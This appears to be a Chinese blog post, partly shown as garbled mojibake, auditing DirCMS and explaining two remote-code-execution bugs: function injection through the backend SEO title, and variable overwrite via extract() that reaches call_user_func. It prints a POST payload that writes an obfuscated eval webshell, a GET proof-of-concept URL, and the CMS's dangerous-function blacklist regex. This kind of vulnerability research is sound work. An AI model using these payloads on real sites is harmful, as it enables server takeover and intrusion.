<p>ä¹Ÿå‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="https://xz.aliyun.com/t/11457">æŸCMSæ¼æ´æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº</a> ä¸­çš„ poc:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">isform</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">csrf_test_name</span><span class="o">=</span><span class="mi">3318</span><span class="n">a4fabdf4ea654734315a4d508a5f</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">name</span><span class="p">]</span><span class="o">=&amp;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="p">[</span><span class="s1">';file_put_contents('</span><span class="n">webshell</span><span class="mf">.</span><span class="n">php</span><span class="s1">',htmlspecialchars_decode('</span><span class="o">&lt;</span><span class="s1">').'</span><span class="o">?</span><span class="n">php</span> <span class="k">eval</span><span class="s1">'.base64_decode('</span><span class="no">KA</span><span class="o">==</span><span class="s1">').'</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'.base64_decode('</span><span class="nc">Ig</span><span class="o">==</span><span class="s1">').'</span><span class="n">password</span><span class="s1">'.base64_decode('</span><span class="nc">Ig</span><span class="o">==</span><span class="s1">').'</span><span class="p">]</span><span class="s1">'.base64_decode('</span><span class="no">KQ</span><span class="o">==</span><span class="s1">').'</span><span class="p">;</span><span class="o">?</span><span class="s1">'.htmlspecialchars_decode('</span><span class="o">&gt;</span><span class="s1">'));return;'</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="å‰å°ä»£ç æ‰§è¡Œå˜é‡è¦†ç›–å¯¼è‡´æ¨¡æ¿å˜é‡å¯æ§">å‰å°ä»£ç æ‰§è¡Œï¼ˆå˜é‡è¦†ç›–å¯¼è‡´æ¨¡æ¿å˜é‡å¯æ§ï¼‰</h3>

<p>dircms/Fcms/Core/View.php ä¸­çš„ list_tag å‡½æ•°ä¸­å­˜åœ¨è¿™æ ·çš„ä»£ç ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// list æ ‡ç­¾è§£æ</span>
<span class="k">public</span> <span class="k">function</span> <span class="n">list_tag</span><span class="p">(</span><span class="nv">$_params</span><span class="p">)</span> <span class="p">{</span>
    <span class="mf">...</span>
    <span class="k">switch</span> <span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'action'</span><span class="p">])</span> <span class="p">{</span>

        <span class="k">case</span> <span class="s1">'function'</span><span class="o">:</span> <span class="c1">//æ‰§è¡Œå‡½æ•°</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="s1">'nameå‚æ•°ä¸å­˜åœ¨'</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="s1">'å‡½æ•°['</span><span class="mf">.</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="mf">.</span><span class="s1">']æœªå®šä¹‰'</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'function-'</span><span class="mf">.</span><span class="nb">md5</span><span class="p">(</span><span class="nf">dr_array2string</span><span class="p">(</span><span class="nv">$param</span><span class="p">));</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cache</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$rt</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'param'</span><span class="p">]);</span>
                <span class="nv">$cache</span> <span class="o">=</span> <span class="p">[</span>
                    <span class="nv">$rt</span>
                <span class="p">];</span>
                <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">'return'</span><span class="p">],</span> <span class="nv">$cache</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
</code></pre></div></div>
<p>å½“ action ä¸ºå­—ç¬¦ä¸² function æ—¶ï¼Œä¼šè°ƒç”¨ <code class="language-plaintext highlighter-rouge">call_user_func($param['name'], $param['param'])</code> æ‰§è¡Œå‡½æ•°ã€‚å¦‚æœå‡½æ•°åä¸å‡½æ•°å‚æ•°å¯æ§ï¼Œåˆ™å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p>

<p>list_tag å‡½æ•°åœ¨å¤§é‡çš„æ¨¡æ¿æ–‡ä»¶ä¸­è¢«è°ƒç”¨ï¼Œä¾‹å¦‚ï¼šcache/template/template_pc_default_home_api_list_data.html.cache.phpã€‚è¯¥æ–‡ä»¶æ˜¯ template/pc/default/home/api/list_data.html ç»è¿‡è§£æä¹‹åç”Ÿæˆçš„ php ç¼“å­˜æ–‡ä»¶ã€‚</p>

<p>å½“éœ€è¦ä½¿ç”¨ list_data.html è¿™ä¸ªå‰ç«¯æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå°† cache/template/template_pc_default_home_api_list_data.html.cache.php è¿™ä¸ªç¼“å­˜æ–‡ä»¶åŒ…å«è¿›æ¥ã€‚</p>

<p>è¯¥ç¼“å­˜æ–‡ä»¶çš„éƒ¨åˆ†å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nv">$list_return</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">list_tag</span><span class="p">(</span><span class="s2">"action=module module=news catid=</span><span class="nv">$catid</span><span class="s2"> page=1 cache=300"</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$list_return</span><span class="p">)</span> <span class="nb">extract</span><span class="p">(</span><span class="nv">$list_return</span><span class="p">,</span> <span class="no">EXTR_OVERWRITE</span><span class="p">);</span> <span class="nv">$count</span><span class="o">=</span><span class="nf">dr_count</span><span class="p">(</span><span class="nv">$return</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$return</span><span class="p">))</span> <span class="p">{</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$return</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$is_first</span><span class="o">=</span><span class="nv">$key</span><span class="o">==</span><span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$is_last</span><span class="o">=</span><span class="nv">$count</span><span class="o">==</span><span class="nv">$key</span><span class="o">+</span><span class="mi">1</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ajax-load-con content excerpt-one"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-box posts-image-box"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"posts-default-title"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-entry-categories"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>å…¶ä¸­ä¼šè°ƒç”¨ list_tag å‡½æ•°ï¼Œä¸”ä¼ å…¥å‚æ•° <code class="language-plaintext highlighter-rouge">action=module module=news catid=$catid page=1 cache=300</code>ã€‚å¯ä»¥çœ‹åˆ°å‚æ•°æ˜¯é€šè¿‡ç©ºæ ¼è¿›è¡Œåˆ†å‰²çš„é”®å€¼å¯¹ï¼Œlist_tag å‡½æ•°åœ¨è¿›è¡Œå¤„ç†æ—¶ï¼Œä¼šå°†é”®å€¼å¯¹ä¿å­˜åœ¨ <code class="language-plaintext highlighter-rouge">$system</code> è¿™ä¸ªå˜é‡ä¸­ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
        <span class="mf">...</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="nv">$var</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// ç³»ç»Ÿå‚æ•°ï¼Œåªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œä¸èƒ½æ·»åŠ ä¿®é¥°ç¬¦</span>
            <span class="nv">$system</span><span class="p">[</span><span class="nv">$var</span><span class="p">]</span> <span class="o">=</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>ä¾‹å¦‚ç¬¬ä¸€ä¸ªå‚æ•° actionï¼š <code class="language-plaintext highlighter-rouge">$system['action'] = dr_safe_replace('module')</code></p>

<p>æƒ³è¦è¿›å…¥ call_user_funcï¼Œå°±éœ€è¦ action çš„å€¼ä¸º functionã€‚ä½†åœ¨å†…ç½®çš„æ‰€æœ‰æ¨¡æ¿ä¸­ï¼Œæ²¡æœ‰æ¨¡æ¿ä½¿ç”¨åˆ°äº† <code class="language-plaintext highlighter-rouge">action=function</code>ã€‚</p>

<p><strong>ä½†éœ€è¦æ³¨æ„çš„æ˜¯</strong>ï¼Œlist_tag åœ¨è°ƒç”¨æ—¶ <code class="language-plaintext highlighter-rouge">$this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300");</code>ï¼Œä½¿ç”¨åˆ°äº†ä¸€ä¸ª <code class="language-plaintext highlighter-rouge">$catid</code> å˜é‡ã€‚ç”±äºè¿™ä¸ªå˜é‡è¢«ç›´æ¥æ‹¼æ¥è¿›æ¥ï¼Œå‡å¦‚æ„é€ </p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$catid</span> <span class="o">=</span> <span class="s2">" action=function name=phpinfo param0=-1"</span>
</code></pre></div></div>
<p>æœ€ç»ˆä¼ å…¥ list_tag çš„å‚æ•°å°±ä¼šå˜æˆï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">list_tag</span><span class="p">(</span><span class="s2">"action=module module=news catid= action=function name=phpinfo param0=-1 page=1 cache=300"</span><span class="p">);</span>
</code></pre></div></div>
<p>action å‚æ•°è¢«è®¾ç½®äº†ä¸¤æ¬¡ï¼Œä½†æœ€ç»ˆä¼šéƒ½è¢«è®¾ç½®ä¸ºåè€…çš„å€¼ï¼Œè¿™æ ·ä¹Ÿå°±è¾¾åˆ°äº†ç›®çš„ã€‚</p>

<p><code class="language-plaintext highlighter-rouge">$catid</code> åœ¨å“ªè¢«èµ‹å€¼å‘¢ï¼Ÿæ¨¡æ¿æ–‡ä»¶å®é™…ä¸Šæ˜¯åœ¨ dircms/Fcms/Core/View.php ä¸­çš„ display å‡½æ•°ä¸­ä½¿ç”¨ include åŒ…å«è¿›æ¥çš„ï¼Œ<strong>åœ¨è¿™ä¸ª include çš„å‰æ–¹ï¼Œæ­£å¥½è°ƒç”¨äº†ä¸€æ¬¡ extract å‡½æ•°ã€‚</strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">display</span><span class="p">(</span><span class="nv">$_name</span><span class="p">,</span> <span class="nv">$_dir</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]))</span> <span class="p">{</span>
			<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="s1">'get'</span><span class="p">]</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">xss_clean</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
		<span class="p">}</span>
        <span class="mf">...</span>

        <span class="nb">extract</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">,</span> <span class="no">EXTR_PREFIX_SAME</span><span class="p">,</span> <span class="s1">'data'</span><span class="p">);</span>

        <span class="mf">...</span>
        <span class="k">include</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">load_view_file</span><span class="p">(</span><span class="nv">$_view_file</span><span class="p">);</span>
        <span class="mf">...</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>extract å‡½æ•°å¯ä»¥é€ æˆå˜é‡è¦†ç›–ï¼Œå¦‚æœ <code class="language-plaintext highlighter-rouge">$this-&gt;_options</code>å¯æ§çš„è¯ï¼Œå°±å¯ä»¥å¯¹ <code class="language-plaintext highlighter-rouge">$catid</code> èµ‹å€¼ã€‚å‘ä¸Šæº¯æºå¯ä»¥å‘ç°æ ¹å¤šåœ°æ–¹éƒ½æœ‰è°ƒç”¨ display å‡½æ•°ï¼Œä½†åªæœ‰ dircms/Core/Controllers/Api/Api.php ä¸­çš„ template å‡½æ•°æœ€æ–¹ä¾¿åˆ©ç”¨ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">template</span><span class="p">()</span> <span class="p">{</span>

    <span class="nv">$file</span> <span class="o">=</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">));</span>
    <span class="nv">$module</span> <span class="o">=</span> <span class="nf">dr_safe_filename</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'module'</span><span class="p">));</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s1">'file'</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">,</span>
        <span class="s1">'module'</span> <span class="o">=&gt;</span> <span class="nv">$module</span><span class="p">,</span>
    <span class="p">];</span>

    <span class="mf">...</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">assign</span><span class="p">(</span><span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="nv">$html</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="nb">ob_clean</span><span class="p">();</span>
    <span class="mf">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>ç›´æ¥è°ƒç”¨ <code class="language-plaintext highlighter-rouge">\Phpcmf\Service::V()-&gt;assign</code> å‡½æ•°å¹¶ä¼ å…¥æ‰€æœ‰ GET è¯·æ±‚å‚æ•°ã€‚<code class="language-plaintext highlighter-rouge">\Phpcmf\Service::V()-&gt;assign</code> å‡½æ•°å°±æ˜¯ç”¨äºç»™ option æˆå‘˜å˜é‡èµ‹å€¼çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">assign</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">FALSE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$key</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">_options</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>ç”±æ­¤ä¸€æ¥ä» GET è¯·æ±‚å‚æ•°ä¸­ä¼ å…¥å³å¯ã€‚poc å¦‚ä¸‹ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">s</span><span class="o">=</span><span class="n">api</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">api</span><span class="o">&amp;</span><span class="n">m</span><span class="o">=</span><span class="n">template</span><span class="o">&amp;</span><span class="n">app</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=</span><span class="n">list_data</span><span class="mf">.</span><span class="n">html</span><span class="o">&amp;</span><span class="n">phpcmf_dir</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">catid</span><span class="o">=%</span><span class="mi">20</span><span class="n">action</span><span class="o">=</span><span class="k">function</span><span class="o">%</span><span class="mi">20</span><span class="n">name</span><span class="o">=</span><span class="n">phpinfo</span><span class="o">%</span><span class="mi">20</span><span class="n">param0</span><span class="o">=-</span><span class="mi">1</span>
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230809040203.png" alt="20230809040203" /></p>

<p>è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ€è·¯æ¥è‡ªäºæ–‡ç«  <a href="https://xz.aliyun.com/t/10002">æŸcms å‰å°RCEæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº</a>ï¼Œé€šè¿‡å˜é‡è¦†ç›–æ§åˆ¶æ¨¡æ¿å˜é‡æ¥è¾¾æˆ RCEï¼Œä¸å¾—ä¸è¯´ååˆ†å·§å¦™ã€‚</p>

<h2 id="æ€»ç»“">æ€»ç»“</h2>
<ol>
  <li>æ¨¡æ¿è§£æåŠŸèƒ½æ˜¯æé«˜ php CMS æ¡†æ¶çµæ´»æ€§çš„é‡è¦åŠŸèƒ½ï¼Œä½†åŒæ ·æ„å‘³ç€å®¹æ˜“å‡ºç°å¯åˆ©ç”¨çš„ç‚¹ï¼Œä¾‹å¦‚ï¼Œåå°ä¿®æ”¹æ¨¡æ¿ã€åˆ©ç”¨å˜é‡è¦†ç›–æ§åˆ¶æ§åˆ¶æ¨¡æ¿å˜é‡ç­‰åˆ©ç”¨æ–¹å¼ã€‚</li>
  <li>ç¼“å­˜æ–‡ä»¶é€šå¸¸ä¼šåœ¨ç¨‹åºä¸­è¢«åŒ…å«è¿›æ¥ï¼Œä¸€æ—¦ç¼“å­˜æ–‡ä»¶çš„å†…å®¹å¯æ§ï¼Œå°±å¯èƒ½é€ æˆä¸¥é‡çš„å½±å“ã€‚</li>
</ol>

<h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1>
<ul>
  <li><a href="https://xz.aliyun.com/t/11457">æŸCMSæ¼æ´æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº</a></li>
  <li><a href="https://xz.aliyun.com/t/10002">æŸcms å‰å°RCEæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="code audit" /><category term="CMS" /><summary type="html"><![CDATA[DirCMS å®¡è®¡ ç¯å¢ƒæ­å»º å®˜ç½‘é“¾æ¥ï¼šhttp://www.dircms.cc/ ä¸‹è½½åœ°å€ï¼šdircms6 ç›®å½•ç»“æ„ ä»£ç ç›®å½•ç»“æ„ . â”œâ”€â”€ admin.php â”œâ”€â”€ api â”œâ”€â”€ cache â”œâ”€â”€ config â”œâ”€â”€ dircms â”œâ”€â”€ favicon.ico â”œâ”€â”€ index.php â”œâ”€â”€ install.php â”œâ”€â”€ LICENSE â”œâ”€â”€ mobile â”œâ”€â”€ nginx.htaccess â”œâ”€â”€ README.en.md â”œâ”€â”€ README.md â”œâ”€â”€ static â”œâ”€â”€ template â”œâ”€â”€ test.php â””â”€â”€ uploadfile dircms ä¸ºæ¡†æ¶å†…æ ¸æ–‡ä»¶ï¼ŒåŸºäºè¿…ç¿ CMS æ¡†æ¶ï¼šè¿…ç¿CMSæ¡†æ¶ MVC ç»“æ„ æ§åˆ¶å™¨ï¼šåŠŸèƒ½ç›¸å…³æ§åˆ¶å™¨å­˜æ”¾åœ¨ dircms/App ç›®å½•ä¸‹ æœåŠ¡ç±»ï¼ˆServiceï¼‰ï¼šå­˜æ”¾åœ¨ dircms/Fcms/Core/Service.php åŸºç¡€ç±»ï¼šå­˜æ”¾åœ¨ dircms/Fcms/Library ç›®å½•ä¸‹ æ•°æ®æµï¼šæ§åˆ¶å™¨ -&gt; æœåŠ¡ç±» Service -&gt; ç±»åŠ è½½ï¼ˆåŠ è½½åŸºç¡€ç±»ï¼‰ API pay ueditor å®‰å…¨é˜²æŠ¤ dircms/Fcms/Library/Security.php å­˜åœ¨ XSS è¿‡æ»¤å‡½æ•° xss_cleanï¼Œå…¶ä¸­é™¤äº† xss è¿‡æ»¤ä¹‹å¤–ï¼Œè¿˜æœ‰éƒ¨åˆ†çš„ php å‡½æ•°è¿‡æ»¤ã€‚ $str = preg_replace( '#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', '\\1\\2&amp;#40;\\3&amp;#41;', $str ); æ¼æ´æŒ–æ˜ åå°ä»£ç æ‰§è¡Œï¼ˆæ¨¡æ¿è§£æå¯¼è‡´ RCEï¼‰ dircms/Fcms/Core/Helper.php ä¸­å­˜åœ¨ä¸€ä¸ª php55_replace_function å‡½æ•°ï¼š function php55_replace_function($value) { if (function_exists($value[1])) { // æ‰§è¡Œå‡½æ•°ä½“ $param = $value[2] == '$data' ? $this-&gt;data : $value[2]; return call_user_func_array( $value[1], is_array($param) ? ['data' =&gt; $param] : @explode(',', $param) ); } else { return 'å‡½æ•°['.$value[1].']æœªå®šä¹‰'; } return $value[0]; } è¯¥å‡½æ•°è°ƒç”¨äº† call_user_func_array å‡½æ•°ï¼Œä¸€æ—¦ä¼ å…¥çš„å‚æ•° $value å¯æ§ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»»æ„ php å‡½æ•°ã€‚ php55_replace_function å‡½æ•°è°ƒç”¨ç‚¹è¾ƒå¤šï¼Œå…¶ä¸­ dircms/Fcms/Library/Seo.php ä¸­çš„ search å‡½æ•°ä¹Ÿç”¨åˆ°äº†è¯¥æ–¹æ³•ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š $rep = new \php5replace($data); ... $seo['meta_title'] = str_replace('%', '', preg_replace_callback('#{([a-z_0-9]+)\((.*)\)}#Ui', array($rep, 'php55_replace_function'), $seo['meta_title'])); ... ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… $seo['meta_title']) çš„å€¼ï¼ŒåŒ¹é…å†…å®¹åŒ…å«æ•´ä¸ªå‡½æ•°è°ƒç”¨ã€‚ä½†æ˜¯è¿™é‡Œçš„æ‰§è¡Œä¹Ÿæœ‰ä¸€å®šé™åˆ¶ï¼š å‡½æ•°ååªèƒ½åŒ¹é…å°å†™å­—æ¯ã€æ•°å­—ä¸ä¸‹åˆ’çº¿ã€‚ æ— æ³•åµŒå¥—å‡½æ•°è°ƒç”¨ã€‚ $seo['meta_title'])æ¥æºäºåå° SEO è®¾ç½®ï¼Œåœ¨â€è®¾ç½®â€-&gt; SEO è®¾ç½® -&gt; æœç´¢ SEO ä¸­å¯ä»¥è®¾ç½® SEO æ ‡é¢˜ï¼Œåœ¨å…¶ä¸­çš„å†…å®¹ä¸­æ·»åŠ ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼š [ç¬¬{page}é¡µ{join}][{keyword}{join}][{param}{join}]{modulename}{join}{SITE_NAME}{phpinfo(1)} ä¿å­˜ä¹‹åï¼Œå†åœ¨å‰ç«¯è®¿é—®æœç´¢é¡µé¢: /index.php?s=news&amp;c=search&amp;keyword=1111 å½“å°è¯•ä½¿ç”¨ system æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¼šå‘ç°è¾“å…¥çš„ system() ä¸­çš„æ‹¬å·ä¼šè¢« html è½¬ä¹‰ï¼Œå…¶è¿‡æ»¤å‡½æ•°å¯ä»¥å®šä½åˆ° dircms/Fcms/Library/Security.php ä¸­çš„ xss_clean å‡½æ•°ï¼Œè¯¥å‡½æ•°é™¤äº†ä¼šè¿›è¡Œ XSS çš„è¿‡æ»¤ï¼Œè¿˜ä¼šè¿›è¡Œ PHP æ ‡ç­¾ &lt;? ä»¥åŠæ•æ„Ÿå‡½æ•°çš„è¿‡æ»¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š $str = preg_replace( '#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', '\\1\\2&amp;#40;\\3&amp;#41;', $str ); å…¶ä¸­è¿‡æ»¤äº†å¸¸è§çš„ä¸€äº›å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä½†å¹¶ä¸å®Œå…¨ï¼Œç»¼åˆæ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ»¡è¶³ä¸‹é¢æ¡ä»¶çš„å‡½æ•°å»æ‰§è¡Œå‘½ä»¤ï¼š ä¸åœ¨é»‘åå•å†…ã€‚ ä¸èƒ½åµŒå¥—å‡½æ•°ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ file_put_content ç»“åˆ php://filter æ¥å†™å…¥æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š 